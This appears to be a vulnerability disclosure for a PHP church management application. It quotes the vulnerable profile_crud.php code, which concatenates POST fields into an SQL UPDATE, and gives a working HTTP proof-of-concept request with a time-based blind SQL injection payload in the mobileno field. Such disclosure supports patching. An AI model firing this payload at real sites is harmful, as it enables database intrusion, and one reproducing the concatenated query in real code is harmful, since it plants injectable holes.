### Vulnerability file address

`church/admin/app/profile_crud.php` from line 39,The `$_POST['mobileno']` parameter is controllable and the `$_POST['mobileno']` is not protected from sql injection, line 39

 ````
$stmt = $conn->prepare("UPDATE `login` SET `username`='" . $_POST['username'] . "',`email`='" . $_POST['email'] . "',`mobileno`='" . $_POST['mobileno'] . "',`image`='" . $img . "' WHERE id='" . $_SESSION['id'] . "' ");
 ````

 line 41 `$stmt->execute();` performs a SQL query, causing SQL injection

```php
<?php
session_start();
include '../../assets/constant/config.php';

try {
	$conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
	echo "Connection failed: " . $e->getMessage();
}
if (isset($_POST['update'])) {

	$uploadDir = '../../assets/images/';
	if ($_FILES['image']['tmp_name'] != '') {
		$filepath = "../../assets/images/" . $_FILES["image"]["name"];
		$originalName = basename($_FILES['image']['name']);
		$extension = pathinfo($originalName, PATHINFO_EXTENSION);

		// Generate a new unique file name
		$newName = uniqid() . '.' . $extension;

		// Set the path to the new file location
		$newFilePath = $uploadDir . $newName;

		// Upload the file to the server


		if (move_uploaded_file($_FILES["image"]["tmp_name"], $filepath)) {
			$img = $_FILES["image"]["name"];

			@unlink("../../assets/images/" . $_POST['old_cat_img']);
		}
	} else {
		$img = $_POST['old_cat_img'];
	}


	//echo "UPDATE `login` SET `username`='".$_POST['username']."',`email`='".$_POST['email']."',`mobileno`='".$_POST['mobileno']."',`image`='".$img."' WHERE id='".$_SESSION['id']."' ";exit;
	$stmt = $conn->prepare("UPDATE `login` SET `username`='" . $_POST['username'] . "',`email`='" . $_POST['email'] . "',`mobileno`='" . $_POST['mobileno'] . "',`image`='" . $img . "' WHERE id='" . $_SESSION['id'] . "' ");

	$stmt->execute();
```

### POC

```http
POST /church/admin/app/profile_crud.php HTTP/1.1
Host: www.church.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=kecn6qqrggjnvlpgliqeq951j0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

update=1&email=&old_cat_img=&mobileno=' WHERE 2536=2536 AND (SELECT 3731 FROM (SELECT(SLEEP(5)))cvrj)-- dvTm
```

### Attack results pictures

![image-20250220215348080](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502202153126.png)